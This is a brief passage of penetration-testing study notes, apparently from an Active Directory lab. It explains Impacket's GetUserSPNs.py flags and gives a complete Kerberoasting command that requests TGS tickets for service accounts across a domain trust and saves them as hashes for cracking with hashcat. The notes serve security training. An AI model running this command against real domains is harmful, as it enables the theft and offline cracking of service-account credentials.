#### Using the -request Flag
- **-request** flag gives us the TGS ticket
- **-outputfile** to output directly into a filewich we can then feed to hashcat
```python
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile hash.txt
```
